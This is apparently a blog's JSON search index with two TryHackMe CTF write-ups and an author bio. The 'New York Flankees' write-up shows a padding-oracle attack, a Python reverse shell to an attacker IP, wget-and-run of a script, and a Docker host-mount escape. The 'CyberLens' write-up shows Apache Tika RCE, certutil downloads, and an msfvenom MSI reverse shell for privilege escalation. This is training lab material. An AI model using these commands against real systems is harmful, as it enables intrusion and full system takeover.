[{"categories":["CTF"],"content":"Introduction Detailed walkthroughs and solutions for New York Flankees CTF challenges on TryHackMe .\nTools Used rustscan, burpsuite\nEnumeration Lets start the process by mapping host-name to target IP address.\nsudo echo \u0026#34;10.10.140.44 nythm.com\u0026#34; \u0026gt;\u0026gt; /etc/hosts Let\u0026rsquo;s start enumaration process using rustscan portscanner.\nrustscan -a nythm.com -- -sC -sV .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-\u0026#39; `-\u0026#39;`-----\u0026#39;`----\u0026#39; `-\u0026#39; `----\u0026#39; `---\u0026#39; `-\u0026#39; `-\u0026#39;`-\u0026#39; `-\u0026#39; The Modern Day Port Scanner. _______________________________________ Open 10.10.140.44:22 Open 10.10.140.44:8080 [~] Starting Script(s) [\u0026gt;] Running script \u0026#34;nmap -vvv -p {{port}} {{ip}} -sC -sV\u0026#34; on ip 10.10.140.44 PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 60 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 86:03:99:d9:07:c6:f5:8c:48:11:b7:56:58:fe:72:06 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAHznW6yrO1o2or52QbWKmOLRYEcbWUD2zy0gHcYzw2sqhx9U/pJxJOa5Z0fwuMVPjRtqGLOk3EOrBnQ6LstnOyGx0KUsBn3c/hSHNCS9uzVbDzikf6ffQLw0hAcJzSi1EsQDRkeyJ24NuzhQ9RXKO1R1Gr0RB4AcmvIoNspcxV0KTiTOIWuAPiJLiZtsOSS39zghuRjvWwnWQ3jR0X2r5NPjphojx3pKxlDNhf9gpaz2kck/Jv8cfktisANej2q4JY+BEL9VaxyBV8DOq/WU9E8TvIGYEK1sOh1UKCl7JgKBbA+30Wge+/EsiV/zEQooDQvNUT5YgUwCCAdClLYxR996glhDywuGYIAOE/VIP69k0JAbkZy8kwP22t0ZHunJrFaPWL5iw++O6/NKTL2xQXwAmKZu81B7Un3Q35lal7k6YO9agJJ4oxD7z15Ee+eJf4KxSOYhSA89KhDQSbrkpZKMyuJ6uoJHXVVyZmMRO2IaraJaY156vZxe9fkOyLvE= | 256 0e:b9:fd:e8:8a:7c:fc:b9:91:b0:3d:0d:16:c9:43:3c (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN1JAvVFTNHO87FGw+Q3NxpS0st1TbH9/Tn+PLJMBdVQ/NHeBZSdt/954gYSL6c0Plt8YiuVswjf//DSHz1rff0= | 256 9c:be:88:a2:44:56:2b:ba:dd:b9:5a:da:f2:24:8a:f5 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILwrt82psPblgKYPcZ1VkSr/bVktYgYaVX+zqGdFFrwK 8080/tcp open http syn-ack ttl 59 Octoshape P2P streaming web service |_http-title: Hello world! | http-methods: |_ Supported Methods: GET |_http-favicon: Unknown favicon MD5: 6FD74A43E6C5F7502642326FAB0B3E69 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel From the above results we found 2 open ports 22(ssh) and 8080(web server) and the operating system is Linux. Starting with port 8080.\nHome Page This is a blog website of user Stefan. Here the word Oracle is highlighted 2 times using bold text and image. So, must be using one of the Oracle services.\nAdmin Login Page This website have an admin login page which will use it in future, as we need to enumarate further to get hints about username or password.\nDebug page This website also have an Dubug page, which is giving hints about Implementation of custom authentication mechanism and verbose error (padding).\nview-source of home page We found a script in the page while checking the source of the page.\nadding cookie using cookie editor extension Tried to bypass the login by adding the loggedin cookie using cookie editor[firefox extension], but exec.html page gives error.\nInspect: debug.html page Checking network history of debug.html page, found one interesting request trying to connect to its localhost. Lets change its host to its webserver address.\nchanging the host using Burpsuite Changing the host of the request to web server address gives us response: Custom authentication success.\nmodifying the url using Burpsuite When modifying the string after /api/debug/ in the request, we got an error: Decryption error as a response. This informs there is some cryptography is being used here. So, I tried to decrypt the string below\n39353661353931393932373334633638EA0DCC6E567F96414433DDF5DC29CDD5E418961C0504891F0DED96BA57BE8FCFF2642D7637186446142B2C95BCDEDCCB6D8D29BE4427F26D6C1B48471F810EF4 using various decryption tools, but none of those helped. Proceeding further.\nPadding Oracle Google Search After multiple attempts of Google search using hints we have, found an interesting result.\nPadding Oracle - HackTricks Padding Oracle - HackTricks : The same behaviour (error when modifing the value) we observed in /api/debug/ request. By this point we got that the web application is vulnerable to padding oracle vulnerability.\nExploitation Found multiple exploit codes for this vulnerability when googling it. Search term used padding oracle vulnerability exploit github. Two exploits I\u0026rsquo;ve used are below.\nmpgn/Padding-oracle-attack - slow and detailed python exploit.py -c 39353661353931393932373334633638EA0DCC6E567F96414433DDF5DC29CDD5E418961C0504891F0DED96BA57BE8FCFF2642D7637186446142B2C95BCDEDCCB6D8D29BE4427F26D6C1B48471F810EF4 -l 16 --host nythm.com:8080 -u /api/debug/ --error \u0026#34;Decryption error\u0026#34; glebarez/padre - binary - fast chmod +x padre-linux-amd64 ./padpadre-linux-amd64re -u \u0026#39;http://nythm.com:8080/api/debug/$\u0026#39; -e lhex 39353661353931393932373334633638EA0DCC6E567F96414433DDF5DC29CDD5E418961C0504891F0DED96BA57BE8FCFF2642D7637186446142B2C95BCDEDCCB6D8D29BE4427F26D6C1B48471F810EF4 The above exploits will give the username and password in the format username:password, which is the flag1 of this lab.\nAdmin login lets use the username:password combination to login the admin panel.\nSuccessful Addmin login Kudos!!! \u0026#x1f929; We found the flag2. There is a command box and a submit button which we might be useful to get reverse shell. Lets check its behaviour.\nExecuting valid command Executing valid command gives OK response.\nExecuting invalid command Executing invalid command gives empyt response. Lets use this behaviour to get reverse shell code.\nReverse Shell python3 -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.11.10.99\u0026#34;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\u0026#34;sh\u0026#34;)\u0026#39; # Replace the LHOST(10.11.10.99) with your local ip. Using Reverse Shell Generator to get reverse shell commands, and confirming the valid command using response from the command. The above command gives OK response, means working without any errors. But not getting reverse shell connection. So, creating a shell script exploit.sh in local machine which will be usefull for reverse shell. The contents of the script exploit.sh should be the above command.\nnc -nvlp 1234 Setting up the listener in local machine using the above command in the port 1234.\npython -m http.server 8000 Starting Python HTTP Server in the directory of exploit.sh script, to transfer it to the target system. This will start the http server in port 8000.\nwget http://10.11.10.99:8000/exploit.sh chmod +x exploit.sh ./exploit.sh # Replace 10.11.10.99 your local ip address. # The above commands should be runned individually. Running the above commands in exec.html makes reverse shell. Now we are in the target system as root user.\u0026#x1f60e;\nInteractive shell python3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; ^Z #(Ctrl+z) stty raw -echo \u0026amp;\u0026amp; fg export TERM=xterm Got Interactive shell by running the above commands.\nLets enumarate the files in the target system for next flag. Found an interesting directory /app/.\nroot@02e849f307cc:/app# ls Dockerfile gradle ktor-docker-sample.jar README.md gradle.properties settings.gradle.kts build.gradle.kts gradlew src docker-compose.yml gradlew.bat root@02e849f307cc:/app# cat README.md # README * To get started, simply run `docker-compose up` Directory /app/ contains files related to docker. We can also found README.md file which is pointing to docker-compose file. Viewing the contents of /app/docker-compose.yml we got the next flag3.\nLets check for the docker, and run it if exits.\nDocker root@02e849f307cc:/# docker images REPOSITORY TAG IMAGE ID CREATED SIZE padding-oracle-app_web latest cd6261dd9dda 2 months ago 1.01GB \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; 4187efabd0a5 2 months ago 704MB gradle 7-jdk11 d5954e1d9fa4 3 months ago 687MB openjdk 11 47a932d998b7 2 years ago 654MB root@02e849f307cc:/# docker run -it -v /:/host/ 47a932d998b7 chroot /host/ bash root@e62f1c047af3:/# ls bin dev flag.txt lib lib64 lost+found mnt proc run snap sys usr boot etc home lib32 libx32 media opt root sbin srv tmp var root@e62f1c047af3:/# cat flag.txt THM{FLAG} There were 4 docker images available on the system. While trying to run one of the docker, we got interactive shell in it. Here we got the flag4.\nThis is end of the lab \u0026#x1f36d;\nHappy Hacking!!!\u0026#x1f47d;\n","permalink":"https://cyberjagadeesh.github.io/posts/thenewyorkflankees/writeup/","tags":["Oracle padding","Docker"],"title":"New York Flankees | THM Writeup"},{"categories":["CTF"],"content":"Introduction Detailed walkthroughs and solutions for CyberLens CTF challenges on TryHackMe .\nTools Used rustscan, ping, burpsuite, nc, metasploit, msfvenom.\nEnumeration Lets start the process by mapping host-name to target IP address. mapping cyberlens.thm to the target IP address When any user or application on the system tries to access cyberlens.thm, it will be directed to the IP address specified in the /etc/hosts file. Lets use rustscan for port scanning the target domain. Rustscan is tool to scan the network ports faster.\nrustscan -a cyberlens.thm -- -sC -sV # -a - IPs, or hosts to be scanned # -- -sC -sV - this command adds -sC -sV automatically to nmap #[Eg: nmap -sC -sV cyberlens.thm] rustscan of cyberlens.thm Found 16 open ports on the initial scan of posts using rustscan. Lets wait for executing nmap -sC -sV cyberlens.thm scan. scan result of nmap -sC -sV cyberlens.thm We got service and default script scan results of the host. Found multiple open ports. Lets start with web service, which is running in port 80 and port 61777. We have also confirmed that the target machine is running Windows OS from the above results. cyberlens.thm This is the website to extract the metadata of the images. Lets try using its functionality. metadata result Lets capture its functionality using Burp-suite. Burp-suite capture By checking the burp-suite we know that its connecting to port 61777 to get the meta data of the image. cyberlens.thm:61777 Exploitation Apache Tika 1.17 Server is running in port 61777. Lets make a search about the server. search Apache Tika 1.17 Server Found an interesting git result, where there is detailed information about the vulnerability and its POC in Apache Tika 1.17 Server. Lets use this git page to exploit the vulnerability.\nLet\u0026rsquo;s test the python script from the git by uploading it.\npython -m http.server \u0026lt;port\u0026gt; # -m \u0026lt;module_name\u0026gt; - python module to be used python http.server lin tening in port 9037 certutil -urlcache -f \u0026lt;file_url\u0026gt; \u0026lt;output_file_name\u0026gt; # command to download a file from internet in Windows running exploit.py python script When we try to download a file exploit.py using the script from git, it was successfully downloaded in the target machine. Lets use this for the reverse shell. Getting reverse shell Uploading nc.exe and got reverse shell from it. And we are now logged in as user cyberlens in the target machine. flag 1 We got flag 1.\nPrivilege Escalation Lets start enumerate the system for privilege escalation vector using winPEASx64.exe . executing winPEASx64.exe Found an interesting result. AlwaysInstallElevated Privilege Escalation vector Lets check about it in internet. about AlwaysInstallElevated Found an interesting page where we get information about AlwaysInstallElevated. If .msi file is executed, it will be running with administrator privilege.\nLets create a .msi file to get reverse shell with elevated Privileges.\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=\u0026lt;local_ip\u0026gt; lport=\u0026lt;local_port\u0026gt; -a x64 --platform windows -f msi -o payload.msi # -p - payload to use # -a - The architecture to useitecture # --platform - The platform of the payload # -f - Output format # -o - Save the payload as Lets generate and upload the payload to get reverse shell. getting reverse shell with elevated privs We have generated .msi file using msfvenom, uploaded and executed to get reverse shell as user nt authority\\system. flag 2 We got flag 2.\nAlternate Solution using Metasploit We know that vulnerable web application running apache tika. lets search it. Exploit using Metasploit Using the module exploit/windows/http/apache_tika_jp2_jscript, setting rhosts, rport, lhost and running the module. We confirmed that the target is vulnerable and exploitable. getting meterpreter as CyberLens We got the meterpreter session for the payload. Making this session to background using background command to proceed further. Privilege Escalation using Metasploit Searching AlwaysInstallElevated for privilege escalation in metasploit and got a result windows/local/always_install_elevated.\nSetting session, rhosts, rport, lhost and running the module. We got a new session as user NT AUTHORITY\\SYSTEM, which is highest privilege user in windows.\nFinally we have completed the room Cyberlens.\nHappy Hacking!!!\n","permalink":"https://cyberjagadeesh.github.io/posts/cyberlens/writeup/","tags":["CVE-2018-1335","AlwaysInstallElevated","msi","apache_tika","metasploit","msfvenom"],"title":"CyberLens CTF |THM Writeup"},{"categories":null,"content":"","permalink":"https://cyberjagadeesh.github.io/manifest.json","tags":null,"title":""},{"categories":null,"content":"","permalink":"https://cyberjagadeesh.github.io/search/_index.es/","tags":null,"title":""},{"categories":null,"content":"","permalink":"https://cyberjagadeesh.github.io/search/_index.fr/","tags":null,"title":""},{"categories":null,"content":"","permalink":"https://cyberjagadeesh.github.io/search/_index.hi/","tags":null,"title":""},{"categories":null,"content":"","permalink":"https://cyberjagadeesh.github.io/search/_index.jp/","tags":null,"title":""},{"categories":null,"content":"","permalink":"https://cyberjagadeesh.github.io/search/_index.pl/","tags":null,"title":""},{"categories":null,"content":"","permalink":"https://cyberjagadeesh.github.io/search/_index.ru/","tags":null,"title":""},{"categories":null,"content":"","permalink":"https://cyberjagadeesh.github.io/search/_index.zh-cn/","tags":null,"title":""},{"categories":null,"content":"About Me Hii there,\nA little about myself:\nI am Jagadeeshwaran, @CyberJagadeesh. With a strong foundation in Android Application Reverse Engineering built over 3 years, I have developed a keen eye for understanding how apps function and identifying potential vulnerabilities. My passion extends to the broader realm of cybersecurity, where I specialize in penetration testing with a particular focus on web application security and network vulnerability assessments. To stay at the forefront of the field, I am dedicated to continuous learning, actively participating in CTF challenges, and expanding my skill set to include DAST (Dynamic Application Security Testing). As an eJPT certified professional, I am committed to safeguarding digital assets and collaborating with others to build a more secure digital landscape.\nMy expertise lies in dissecting Android applications to uncover hidden functionalities and weaknesses. This knowledge, coupled with my proficiency in penetration testing, allows me to identify and mitigate potential threats to digital systems. I am constantly seeking new challenges and opportunities to enhance my skill set. By combining my technical abilities with a passion for problem-solving, I strive to be a valuable asset in any cybersecurity team.\n","permalink":"https://cyberjagadeesh.github.io/about/","tags":null,"title":"whoami"}]